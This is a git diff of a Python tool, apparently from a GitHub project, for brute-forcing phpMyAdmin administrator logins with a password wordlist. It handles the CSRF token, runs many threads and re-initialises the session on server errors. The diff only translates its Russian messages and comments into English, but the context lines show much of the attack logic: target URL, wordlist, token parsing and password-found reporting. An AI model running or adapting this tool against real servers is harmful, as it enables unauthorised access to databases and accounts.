@@ -9,10 +9,10 @@ import argparse
 import os
 
 parser = argparse.ArgumentParser(description="\nhttps://github.com/btwnglxs/PhpMyAdmin-csrf-login-brute\n")
-parser.add_argument("-u", "--url", required=True, help="URL-адрес панели phpMyAdmin")
-parser.add_argument("-w", "--wordlist", required=True, help="Путь к словарю паролей")
-parser.add_argument("-n", "--username", default="administrator", help="Имя пользователя (по умолчанию: administrator)")
-parser.add_argument("-t", "--threads", type=int, default=20, help="Количество потоков (по умолчанию: 20)")
+parser.add_argument("-u", "--url", required=True, help="URL to phpMyAdmin admin panel")
+parser.add_argument("-w", "--wordlist", required=True, help="Path to wordlist to use")
+parser.add_argument("-n", "--username", default="administrator", help="Username (default: administrator)")
+parser.add_argument("-t", "--threads", type=int, default=20, help="Threads count (default: 20)")
 
 args = parser.parse_args()
 
@@ -21,12 +21,12 @@ wordlist_path = args.wordlist
 username = args.username
 num_threads = args.threads
 
-print("[*] Подсчет количества паролей в словаре...")
+print("  [i] Counting passwords count in wordlist...")
 try:
     with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
         lines = sum(1 for line in f if line.strip())
 except FileNotFoundError:
-    print(f"[-] Ошибка: Файл словаря '{wordlist_path}' не найден.")
+    print(f"  [!] Error: File '{wordlist_path}' is not found.")
     sys.exit(1)
 
 current = 0
@@ -36,7 +36,7 @@ password_queue = queue.Queue(maxsize=10000)
 lock = threading.Lock()
 
 def parse_token_from_html(html_text):
-    """Вспомогательная функция для поиска токена в HTML-тексте"""
+    # func to search CSRF-token
     soup = BeautifulSoup(html_text, "html.parser")
     token_elements = soup.find_all("input", attrs={"name": "token"})
     
@@ -49,7 +49,7 @@ def parse_token_from_html(html_text):
     return None
 
 def get_csrf_token(session):
-    """Функция для первичного получения токена через GET-запрос"""
+    # func to obtain CSRF-token
     try:
         response = session.get(url, timeout=5)
         if response.status_code == 200:
@@ -99,11 +99,11 @@ def worker():
                 with lock:
                     if not found:
                         found = True
-                        print(f"\n\n[+] Пароль найден: {password}")
+                        print(f"\n\n  [+] Password is found: {password}")
                         os._exit(0) 
             elif res.status_code in [501, 502, 503]:
                 with lock:
-                    print(f"\n[!] Сервер вернул ошибку {res.status_code}. Переинициализация сессии.")
+                    print(f"\n  [!] Error: Server returned {res.status_code} statuscode. Session reinitialization...")
                 token = None  
             else:
                 new_token = parse_token_from_html(res.text)
@@ -114,17 +114,17 @@ def worker():
                 
                 with lock:
                     current += 1
-                    print(f" Пароль: {password:<20} | {current} из {lines}", end="\r")
+                    print(f" Checking: {password:<20} | {current} из {lines}", end="\r")
                 
         except Exception:
             token = None  
             
         password_queue.task_done()
 
-print(f"[*] Цель: {url}")
-print(f"[*] Пользователь: {username}")
-print(f"[*] Потоков: {num_threads}")
-print("[*] Запуск многопоточного перебора...")
+print(f"  [i] Target: {url}")
+print(f"  [i] Username: {username}")
+print(f"  [i] Threads: {num_threads}")
+print("  [i] Launching...")
 
 threads = []
 for i in range(num_threads):
@@ -142,16 +142,16 @@ try:
             if pwd:
                 password_queue.put(pwd)
     
-    # Отправляем маркеры завершения (Poison Pills) для каждого потока
+    # Stopping threads
     for _ in range(num_threads):
         password_queue.put(None)
 
     password_queue.join()
 
 except KeyboardInterrupt:
-    print("\n[-] Перебор прерван.")
+    print("\n  [!] Bruteforce is interrupted.")
     sys.exit(0)
 
 if not found:
-    print("\n[-] Словарь закончился, пароль не найден.")
+    print("\n  [!] The wordlist is exhausted.")
 
